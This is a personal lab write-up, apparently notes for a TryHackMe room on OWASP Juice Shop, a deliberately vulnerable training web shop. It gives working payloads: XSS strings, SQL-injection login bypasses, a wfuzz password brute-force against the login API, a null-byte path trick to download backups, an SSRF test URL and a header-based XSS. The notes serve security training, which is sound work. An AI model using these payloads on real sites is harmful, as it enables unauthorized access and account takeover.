---
tags:
---

**Machine**: http://juice-shop.herokuapp.com/#/ | https://github.com/juice-shop/juice-shop
**Difficulty**: sperm (extremly easy)
**CWE-list**: 

-----

As this is an webshop we will wanbt to try this functionallities
- Registration
- Login
- Buying an item
- Possibly returning an item
- Our wallet functionality if exists
- Logic flaws
- XSS
    - Stored
    - Reflected
- Basket functionality
- Adresses
- IDORs
- CSRF
- Broken access control if we can get to admin functions

#### Prepare
1. Open burpsuite
2. Set up the scope for the target
	![[Pasted image 20250427221451.png]]
	- Set `juice-shop.herokuapp.com` or localhost as host
3. Set up proxy configuration
	![[Pasted image 20250427221756.png]]
	![[Pasted image 20250427221852.png]]
		This will make any hidden fields easier to see as it will unhide them and draw a big red square around them. If you see this big red square you know you are looking at a hidden field.

#### Manually walking the application
In this phase we need to get know how does the application works. We still are not sure if there are admin functionallities, but we know exists
- Authencticated users 
- Unathenticated users (not llogged in)


### Registration
Register using an attack vector that automatically tests for JS XSS, HTML injection and HTML tag attribute injection.
`'"><u>hello`
`'"><u>THE XSS RAT WAS HERE${7'*7'}`
![[Pasted image 20250428180740.png]]
When we look at the inspector we could see its broken.
![[Pasted image 20250428180814.png]]
##### Avatar image feature
They accept an URL which may introduce a SSRF
![[Pasted image 20250428181412.png]]
	Try a self hosted url or a public burpcollaborator like `http://s5yf4ljmn9wgf95dcykd4iu7zy5otd.burpcollaborator.net/`
#### LOGIN

You log by default as an admin, so put this in the username field
```
' or 1=1--
```
Log as Bender
```
bender@juice-sh.op'-- -
```

#### BOLA
You could bruteforce that using wfuzz, redirecting the output to a file, but i'd prefer to send them to caido, as localhost:8081, and saw them on the HTTP history
```sh
wfuzz -u http://10.10.96.201/rest/user/login -d '{"email":"admin@juice-sh.op","password":"FUZZ"}' -w /usr/share/wordlists/seclists/Passwords/Common-Credentials/best1050.txt -H "Content-Type: application/json" -p localhost:8081
```
And then filter by the 200 status code response
On the other hand, to 

### Information Disclosure
The methodology to solve this was to read the avaible content, continuing exploring the website.
TO solve that part download certain confidential document:
```sh
wget http://10.10.235.245/ftp/acquisitions.md 
```
Downloas a backup using an Null byte [[Injection]]
```url
http://10.10.235.245/ftp/package.json.bak%2500.md
```
### Broken access control
Load the page with the source from the inspector open
![[Pasted image 20241101135255.png]]
And see the admin page
![[Pasted image 20241101135430.png]]
So request the `/#/administration` path, and get rid of the 5 stars commit

### Don't see the flags?
and if you don't see the flag try requesting the root page (`http://10.10.235.245` e,g.)

For the next flag you need to intercept the basket, and change 1 to 2, as says in [[Injection]]
>"*Try providing a string where a number is expected, a number where a string is expected, and a number or string where a Boolean value is expected. If an API is expecting a small number, send a large number, and if it expects a small string, send a large one*"

### XSS
XSS or Cross-site scripting is a vulnerability that allows attackers to run javascript in web applications. These are one of the most found bugs in web applications. Their complexity ranges from easy to extremely hard, as each web application parses the queries in a different way. 

**There are three major types of XSS attacks:**

|   |   |
|---|---|
|DOM (Special)|DOM XSS _(Document Object Model-based Cross-site Scripting)_ uses the HTML environment to execute malicious javascript. This type of attack commonly uses the _<script></script>_ HTML tag.|
|Persistent (Server-side)|Persistent XSS is javascript that is run when the server loads the page containing it. These can occur when the server does not sanitise the user data when it is **uploaded** to a page. These are commonly found on blog posts.|
|Reflected (Client-side)|Reflected XSS is javascript that is run on the client-side end of the web application. These are most commonly found when the server doesn't sanitise **search** data.|

Note that we are using **iframe** which is a common HTML element found in many web applications, there are others which also produce the same result. 

This type of XSS is also called XFS (Cross-Frame Scripting), is one of the most common forms of detecting XSS within web applications.

Websites that allow the user to modify the iframe or other DOM elements will most likely be vulnerable to XSS.   

**Why does this work?**

It is common practice that the search bar will send a request to the server in which it will then send back the related information, but this is where the flaw lies. Without correct input sanitation, we are able to perform an XSS attack against the search bar.

We control the IP parameter so when the admin try to access to he get the XSS
![[Pasted image 20241101150148.png]]
But the application is scaping the xss payload, so use this instead:
```http
True-Client-IP: <img src=x onerror=alert('XSS')>
```
then logout from the admin account if you are not logged and login after the request and go to the last ip page
![[Pasted image 20241101151250.png]]
### access to 
```
http://10.10.20.11//#/score-board
```

Hello dear team of TryHackMe, i start to do your rooms and i want to thank you because they are so useful and fun, is excellent content, however there's an issue in https://tryhackme.com/r/room/owaspjuiceshop room which i do not know if that is done in purspose, but the write up suggest me to do ip spoofing to trigger XSS with this payload `True-Client-IP: <iframe src="javascrip:alert(`xss`)"` but it's never triggered because it's scaped by the application, so i did `True-Client-IP: <img src=x onerror=alert('XSS')>` instead and the XSS alert get triggered successfully, but the flag never appear, even after load the root page, i don't know what's going wrong, so i wait for your answer. Many thanks for your time!

`POST /api/Addresss/HTTP/1.1`
>You successfully solved a challenge: Error Handling (Provoke an error that is neither very gracefully nor consistently handled.)

#### Basket functionallity
- Represents the workflo in a diagram
	![[Pasted image 20250428180041.png]]